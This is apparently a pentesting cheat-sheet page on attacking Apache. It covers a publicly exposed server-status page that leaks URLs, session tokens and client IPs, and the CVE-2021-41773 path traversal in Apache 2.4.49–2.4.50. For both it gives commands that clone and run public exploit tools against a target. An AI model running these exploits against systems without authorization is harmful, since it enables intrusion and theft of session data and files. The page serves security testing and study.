# 🐦 Apache

## Server Status

Apache server-status is an **Apache monitoring instance** Available by default at `http://$target/server-status`

In normal cases, the server-status instance is **not accessible by non-local IPs**. However, due to **misconfiguration**, it can be publicly accessible. **This leads anyone to view the great amount of data by server-status.**

### Data exposed

* All URL requested by all hosts/vhosts, including obscure files/directories and session tokens
* All requested client's IPs

### Exploiting it

```bash
# install
git clone https://github.com/mazen160/server-status_PWN.git
cd server-status_PWN
pip3 install -r requirements

# exploit
python3 server-status_PWN.py --url 'http://$target/server-status'
```

## CVE-2021-41773

{% hint style="info" %}
A flaw was found in a change made to path normalization in Apache HTTP Server **2.4.49-2.4.50**.

An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts.

This issue only affects **Apache 2.4.49 & 2.4.50** and not earlier versions.
{% endhint %}

```bash
# install
git clone https://github.com/iilegacyyii/PoC-CVE-2021-41773.git
cd PoC-CVE-2021-41773/
python3 CVE-2021-41773.py --host https://$target
```
